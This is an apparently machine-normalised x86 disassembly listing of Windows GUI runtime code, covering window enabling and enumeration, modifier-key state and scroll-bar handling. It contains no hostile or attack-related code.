add [ eax + eax - 0x4fd3ff5f ] al
inc edx
add ah dl
push edx
inc ebp
add ah dh
loopne r-xdata
mov al 0x39
mov al 0xb
mov al 0xc5
test [ eax ] al
mov eax [ 0x42b02c00 ]
add [ edx + esi * 2 + 0x2d300045 ] bh
inc ebp
add al al
insd
inc ebp
add [ eax + 0x74004554 ] ah
outsd
add [ ebp + ecx + 0x44 ] ch
add al cl
pop ecx
inc ebp
add [ esi + ebx + 0x9e80044 ] ch
inc esp
add ah bl
outsb
inc ebp
add [ eax + 0x24 ] ah
inc ebp
add [ eax ] dl
daa
inc ebp
add [ edi + ebx * 2 + 0x2ff80045 ] bh
inc ebp
add [ eax + esi + 0x45 ] dh
sub_451278
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0xffffffec
push esi
call GetWindowLongA
test bl bl
je r-xdata
test ah 0x2
je r-xdata
test ah 0x2
jne r-xdata
and eax 0xfffffdff
or eax 0x200
jmp r-xdata
push eax
push 0xffffffec
push esi
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetWindowPos
sub_4512c4
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45aa54
mov eax [ rw-data ]
call sub_419cf0
mov eax [ rw-data ]
call sub_419c98
retn
push 0x0
push eax
call ShowOwnedPopups
sub_4512fc
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
mov eax 0x8
call sub_4026dc
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
push 0x0
push ebx
call EnableWindow
sub_45134c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp - 0xc ] edx
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_4513ef
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push j_sub_403638#7
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push sub_4512fc
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4513f6
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
retn
sub_451400
push ebx
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov ebx esi
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
je r-xdata
mov esi [ ebx ]
mov edx 0x8
mov eax ebx
call sub_4026fc
test esi esi
jne r-xdata
push 0xffffffff
mov eax [ ebx + 0x4 ]
push eax
call EnableWindow
sub_451438
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
je r-xdata
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
sub_45149c
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
push 0x0
push sub_451438
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
retn
mov eax [ rw-data ]
retn
sub_4514f8
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
or edx 0xffffffff
mov ecx eax
mov ebx [ ecx ]
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax edx
pop ebx
pop ebp
retn 0x8
xor edx edx
mov [ ecx + 0x4 ] 0x1
sub_451518
add esp 0xfffffff8
call GetActiveWindow
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
mov eax esp
push eax
push sub_4514f8
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov al [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_451544
push ebx
push esi
push edi
push ebp
mov ebp eax
mov eax [ rw-data ]
call sub_457fa4
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_45845c
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
xor ebx ebx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407cb0
test eax eax
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_457f90
mov ebx eax
test [ ebx + 0x1d ] 0x2
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_458448
mov ebx eax
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407cb0
test eax eax
je r-xdata
sub_4515c4
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test si 0x4
je r-xdata
test si 0x8
je r-xdata
or bl 0x1
test si 0x1
je r-xdata
or bl 0x4
test si 0x2
je r-xdata
or bl 0x8
test si 0x10
je r-xdata
or bl 0x10
push 0x12
call GetKeyState
test ax ax
jge r-xdata
or bl 0x20
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_451618
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
or bl 0x1
test esi 0x20000000
je r-xdata
or bl 0x4
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_451654
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test [ esi + 0x10 ] 0x80
je r-xdata
test [ esi + 0x11 ] 0x80
je r-xdata
or bl 0x1
test [ esi + 0x12 ] 0x80
je r-xdata
or bl 0x4
test [ esi + 0x1 ] 0x80
je r-xdata
or bl 0x2
test [ esi + 0x2 ] 0x80
je r-xdata
or bl 0x8
test [ esi + 0x4 ] 0x80
je r-xdata
or bl 0x10
mov eax ebx
pop esi
pop ebx
retn
or bl 0x20
sub_4516a0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4516fe
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_44f25c
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_4040d0
mov eax [ ebp - 0x8 ]
pop edx
call sub_407cb0
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451705
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f0c
retn
sub_451710
push ebx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
pop ebx
retn
sub_451738
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor edx edx
mov [ ebp - 0xc ] edx
mov esi eax
xor eax eax
push ebp
push sub_4517a9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_451710
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4517b0
lea eax [ ebp - 0xc ]
call sub_403ee8
retn
mov eax [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
call sub_403924
sub_4517b8
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403168
mov [ edi + 0x4 ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x18 ] al
mov cx 0x50
mov [ edi + 0xa ] cx
movzx eax cx
mov ecx 0xa
xor edx edx
div ecx
mov [ edi + 0x8 ] ax
mov [ edi + 0x1c ] 0x1
mov [ edi + 0x20 ] 0xa
mov [ edi + 0x40 ] 0x4
mov [ edi + 0x3c ] 0xc
mov [ edi + 0x28 ] 0xff000014
mov [ edi + 0x2c ] 0x1
mov [ edi + 0x44 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_451848
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_414654
mov edi esi
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_452110
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_4520f0
mov edx [ edi + 0xc ]
mov eax ebx
call sub_451fa0
mov ax [ edi + 0x8 ]
mov [ ebx + 0x8 ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_451898
push ebx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_451a50
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_43abe4
test al al
jne r-xdata
mov edx [ ebx + 0x10 ]
mov eax ebx
call sub_451fa0
xor edx edx
mov eax ebx
call sub_451fa0
jmp r-xdata
sub_4518d0
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebx + 0x5b ] 0x3
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x40 ]
add edx [ ebx + 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4242dc
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x48 ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_45193c
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x2
jb r-xdata
cmp [ ebx + 0x5b ] 0x1
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x44 ]
add edx [ ebx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4242dc
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x4c ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_4519a4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x210 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_4520d8
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_43da88
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1a ]
add edx eax
mov eax [ ebp - 0x8 ]
call sub_4520d8
jmp r-xdata
inc ebx
xor esi esi
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_43da4c
call sub_45193c
pop ecx
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_43da4c
call sub_4518d0
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
inc esi
dec ebx
jne r-xdata
sub_451a50
push ebx
push esi
mov ebx eax
mov esi 0x100000
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov esi 0x200000
xor eax eax
pop esi
pop ebx
retn
push 0xfffffff0
mov eax [ ebx + 0x4 ]
call sub_440d58
push eax
call GetWindowLongA
test eax esi
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_451a88
push ebp
mov ebp esp
push ebx
mov ebx 0x100000
cmp ax 0x1
jne r-xdata
push 0xfffffff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_440d58
push eax
call GetWindowLongA
test eax ebx
setne al
pop ebx
pop ebp
retn
mov ebx 0x200000
sub_451abc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_451a88
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_451a88
pop ecx
test al al
je r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
neg ebx
jmp r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
sub_451b38
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_440d58
push eax
call GetWindowLongA
test eax 0x840000
setne al
and eax 0x7f
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
push ebp
mov dx 0x14
mov ax 0x1
call sub_451abc
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_439f74
add ebx eax
mov eax ebx
push ebp
mov dx 0x15
xor eax eax
call sub_451abc
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_439fb8
add ebx eax
mov eax ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_451bd0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x1c ] 0x1c
mov [ ebp - 0x18 ] 0x10
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
movsx esi [ esi + 0x6 ]
lea eax [ ebp - 0x1c ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_440d58
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
mov ebx 0x1
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_451c30
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x4
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_451e01 ]
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_451fa0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
add edx eax
mov eax [ ebp - 0x4 ]
call sub_451fa0
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_451b38
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_451fa0
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_451b38
mov edx eax
mov eax [ ebp - 0x4 ]
add edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_451fa0
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_451fa0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_451fa0
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0x8 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x40 ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov eax ebx
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov esi ecx
jmp r-xdata
sub ax 0x2
jb r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_451fa0
jmp r-xdata
push ebp
call sub_451bd0
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_451fa0
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
xor edi edi
test esi esi
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov esi ecx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_451fa0
jmp r-xdata
push ebp
call sub_451bd0
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_451fa0
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
call sub_40696c
mov ebx eax
mov eax ebx
sub eax edi
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20 ]
cmp eax edx
jge r-xdata
xor esi esi
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov edi ebx
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
sub edx eax
push edx
call Sleep
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_451fa0
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_451fa0
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_451fa0
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
dec esi
test esi esi
jg r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_451fa0
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_451fa0
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_451fa0
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_451fa0
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_451fa0
jmp r-xdata
sub_451f28
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x24 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x24 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_452618
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x24 ] eax
sub_451fa0
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebx + 0x14 ]
cmp edx eax
jle r-xdata
mov [ ebx + 0xc ] edx
jmp r-xdata
test edx edx
jge r-xdata
mov edx eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
xor edx edx
mov si 0x1
xor esi esi
jmp r-xdata
movzx edi si
push edi
mov eax [ ebx + 0x4 ]
call sub_440d58
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax [ ebx + 0xc ]
je r-xdata
mov [ ebx + 0xc ] edx
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebx + 0xc ]
cmp edx eax
je r-xdata
push 0xffffffff
mov eax [ ebx + 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
call sub_440d58
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ecx eax
sub ecx edx
mov eax [ ebx + 0x4 ]
xor edx edx
call sub_440910
sub eax edx
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x4 ]
call sub_440910
jmp r-xdata
call sub_451710
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_452064
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_452618
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x30 ] eax
sub_45211c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
cmp bl 0x1
cmc
sbb eax eax
push eax
mov eax [ esi ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_440d58
push eax
call sub_425f04
mov eax [ esi ]
cmp [ eax + 0x24 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp [ eax + 0x38 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_440d58
push eax
call sub_425f04
mov eax [ esi ]
cmp [ eax + 0x30 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_440d58
push eax
call sub_425f04
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x28 ]
call sub_41c964
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_440d58
push eax
call sub_425f04
pop esi
pop ebx
pop ebp
retn
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_440d58
push eax
call sub_425f04
sub_452224
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
xor ebx ebx
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov bx 0x1
mov [ ebp - 0x22 ] 0x1c
mov [ ebp - 0x1e ] 0x17
xor eax eax
mov [ ebp - 0x1a ] eax
mov eax [ esi ]
cmp [ eax + 0x14 ] 0x0
jle r-xdata
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_451b38
mov edx [ esi ]
mov edi [ edx + 0x10 ]
sub edi eax
mov eax [ esi ]
mov [ eax + 0x14 ] edi
test edi edi
jge r-xdata
xor eax eax
mov [ ebp - 0x16 ] eax
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x16 ] eax
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bx
mov ecx 0xa
xor edx edx
div ecx
mov edx [ esi ]
mov [ edx + 0x8 ] ax
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_451b38
inc eax
mov [ ebp - 0x12 ] eax
mov eax [ esi ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xe ] eax
mov [ ebp - 0xa ] eax
push ebp
mov eax [ esi ]
mov al [ eax + 0x44 ]
call sub_45211c
pop ecx
mov eax [ esi ]
mov [ eax + 0x44 ] 0x0
push 0xffffffff
lea eax [ ebp - 0x22 ]
push eax
movzx eax bx
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_440d58
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov eax [ esi ]
call sub_451fa0
xor ecx ecx
mov dl 0x1
mov eax [ esi ]
call sub_451b38
lea eax [ eax + eax * 8 ]
mov ecx 0xa
cdq
idiv ecx
mov ebx eax
mov eax [ esi ]
mov [ eax + 0xa ] bx
mov eax [ esi ]
